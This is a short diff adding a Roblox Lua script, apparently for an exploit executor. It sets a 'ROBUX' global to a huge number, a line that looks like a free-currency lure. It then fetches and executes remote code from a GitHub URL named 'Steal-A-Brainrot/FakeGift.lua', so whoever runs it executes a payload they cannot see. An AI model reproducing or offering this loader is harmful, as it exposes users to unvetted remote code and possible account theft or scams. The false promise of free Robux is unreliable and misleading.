@@ -1,0 +1,3 @@
+lua
+getgenv().ROBUX = 99999999999999999999999999999999999999999999999999999999
+loadstring(game:HttpGet("https://raw.githubusercontent.com/platinww/CrustyMain/refs/heads/main/Steal-A-Brainrot/FakeGift.lua"))()
